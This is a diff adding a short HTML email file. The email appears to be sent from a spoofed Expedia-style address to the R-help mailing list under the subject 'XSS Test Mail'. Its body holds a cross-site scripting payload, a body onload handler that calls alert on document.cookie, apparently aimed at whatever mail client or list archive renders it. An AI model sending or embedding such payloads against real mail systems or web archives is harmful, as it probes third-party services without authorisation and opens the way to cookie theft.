@@ -1,0 +1,7 @@
+From: expedia.com_011234@expedia.customer-email.com
+To: "r-help@lists.R-project.org" <r-help@stat.math.ethz.ch>
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Mail XSS TEST BY s3v3v10111<body onload=alert(document.cookie)>
